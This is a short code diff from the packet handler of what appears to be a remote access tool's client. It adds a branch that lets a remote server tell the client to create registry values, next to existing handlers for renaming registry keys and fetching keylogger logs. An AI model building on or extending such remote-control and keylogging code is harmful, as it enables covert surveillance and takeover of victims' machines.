@@ -140,6 +140,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleRenameRegistryKey((ServerPackets.DoRenameRegistryKey)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoCreateRegistryValue))
+            {
+                CommandHandler.HandleCreateRegistryValue((ServerPackets.DoCreateRegistryValue)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
